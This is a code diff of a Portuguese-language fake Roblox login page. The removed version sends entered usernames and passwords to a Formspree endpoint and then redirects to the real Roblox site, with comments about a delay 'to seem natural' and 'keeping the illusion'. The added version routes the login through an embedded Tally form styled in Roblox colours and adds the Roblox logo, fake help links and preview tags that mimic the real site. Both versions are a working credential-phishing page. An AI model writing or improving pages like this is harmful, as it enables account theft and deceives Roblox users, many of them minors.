@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Entrar no Roblox</title>
-    <!-- Favicon padrão do navegador se não carregar o ícone específico -->
+    <!-- Ícone da aba -->
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
     
     <style>
@@ -16,15 +16,15 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            padding: 10px; /* Margem extra para mobile */
+            padding: 10px;
         }
         .login-box {
             background: white;
-            padding: 30px 40px;
+            padding: 40px;
             border-radius: 8px;
             width: 100%;
-            max-width: 320px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            max-width: 360px; /* Largura similar ao site real */
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
             text-align: center;
             box-sizing: border-box;
         }
@@ -32,81 +32,54 @@
             text-align: center; 
             color: #393a3c; 
             margin-top: 0;
-            margin-bottom: 20px; 
-            font-size: 20px; 
-            font-weight: 600;
+            margin-bottom: 25px; 
+            font-size: 24px; 
+            font-weight: 700;
         }
-        input {
+        
+        /* Ajuste do Iframe para remover margens brutas do Tally */
+        iframe {
             width: 100%;
-            padding: 12px;
-            margin: 5px 0 15px 0;
-            border: 1px solid #aeb4b9;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 16px;
-            background-color: #f2f4f5;
-            color: #333;
-        }
-        input:focus {
-            outline: none;
-            border-color: #0074bd;
-            background-color: #fff;
-        }
-        button {
-            width: 100%;
-            background-color: #00b06f;
-            color: white;
-            padding: 12px;
             border: none;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.2s;
+            min-height: 220px;
+            display: block;
+            margin: 0 auto;
         }
-        button:hover { 
-            background-color: #009a60; 
-        }
-        button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
+
+        /* Links Falsos */
         .links { 
             text-align: center; 
-            margin-top: 15px; 
+            margin-top: 20px; 
             font-size: 14px; 
         }
         .links a { 
             color: #0074bd; 
             text-decoration: none; 
             display: block; 
-            margin-bottom: 5px; 
+            margin-bottom: 8px; 
             cursor: pointer;
         }
-        .links a:hover { 
-            text-decoration: underline; 
-        }
-        
-        /* Ajustes para telas muito pequenas */
-        @media (max-width: 400px) {
-            .login-box {
-                padding: 20px;
-            }
-        }
+        .links a:hover { text-decoration: underline; }
     </style>
 <meta property="og:title" content="Entrar no Roblox"><meta name="description" content="Login"><meta property="og:description" content="Login"><meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_beta_logo.png"><meta property="og:type" content="website"></head>
 <body>
 
 <div class="login-box">
-    <!-- Logo removida conforme pedido -->
+    <!-- Logo do Roblox -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_beta_logo.png" alt="Roblox Logo" style="width: 180px; margin-bottom: 20px;">
     
     <h2>Entrar</h2>
-    <form id="robloxForm">
-        <input type="text" name="username" placeholder="Usuário/e-mail/telefone" required autocomplete="off">
-        <input type="password" name="password" placeholder="Senha" required>
-        <button type="submit" id="submitBtn">Entrar</button>
-    </form>
+    
+    <!-- SEU FORMULÁRIO TALLY AQUI -->
+    <iframe 
+        id="tally-iframe"
+        src="https://tally.so/r/J1paNo?hideTitle=1&transparentBackground=1&dynamicHeight=1" 
+        width="100%" 
+        frameborder="0" 
+        allowfullscreen>
+    </iframe>
 
+    <!-- Links Falsos -->
     <div class="links">
         <a href="javascript:void(0)">Esqueceu a senha?</a>
         <a href="javascript:void(0)">Envie-me um código por e-mail</a>
@@ -114,41 +87,44 @@
 </div>
 
 <script>
-    // NOVO ID DO FORMSPREE
-    const FORM_ID = 'meagazvo'; 
-    const REDIRECT_URL = 'https://www.roblox.com/login';
+    // Script para ajustar altura automática e aplicar o VERDE no botão
+    const iframe = document.getElementById('tally-iframe');
+    
+    // Função para injetar CSS personalizado no iframe do Tally
+    function injectStyles() {
+        if (iframe.contentWindow.document) {
+            const style = iframe.contentWindow.document.createElement('style');
+            style.innerHTML = `
+                button[type="submit"] {
+                    background-color: #00b06f !important; /* Verde Roblox */
+                    color: white !important;
+                    border: none !important;
+                    border-radius: 8px !important;
+                    font-weight: bold !important;
+                    font-size: 16px !important;
+                    width: 100% !important;
+                    padding: 12px !important;
+                    cursor: pointer !important;
+                    transition: background-color 0.2s;
+                }
+                button[type="submit"]:hover {
+                    background-color: #009a60 !important; /* Verde mais escuro no hover */
+                }
+                /* Remove o logo pequeno do Tally se quiser deixar mais limpo */
+                .tally-powered { display: none !important; }
+            `;
+            iframe.contentWindow.document.head.appendChild(style);
+            
+            // Ajusta a altura do iframe baseado no conteúdo carregado
+            try {
+                iframe.style.height = iframe.contentWindow.document.body.scrollHeight + 'px';
+            } catch(e) {}
+        }
+    }
 
-    document.getElementById('robloxForm').addEventListener('submit', function(e) {
-        e.preventDefault(); 
-        
-        const btn = document.getElementById('submitBtn');
-        const originalText = btn.innerText;
-        
-        // Feedback visual de carregamento
-        btn.disabled = true;
-        btn.innerText = "Verificando...";
-        btn.style.opacity = "0.8";
-
-        const formData = new FormData(this);
-        const data = Object.fromEntries(formData.entries());
-
-        fetch(`https://formspree.io/f/${FORM_ID}`, {
-            method: 'POST',
-            body: JSON.stringify(data),
-            headers: { 'Content-Type': 'application/json' }
-        }).then(() => {
-            // Delay artificial de 1.5 segundos para parecer natural
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 1500); 
-        }).catch(error => {
-            console.error('Erro:', error);
-            // Mesmo em erro, redireciona para manter a ilusão
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 500);
-        });
-    });
+    iframe.onload = injectStyles;
+    // Tenta chamar imediatamente caso o iframe carregue muito rápido
+    setTimeout(injectStyles, 1000); 
 </script>
 
 </body>
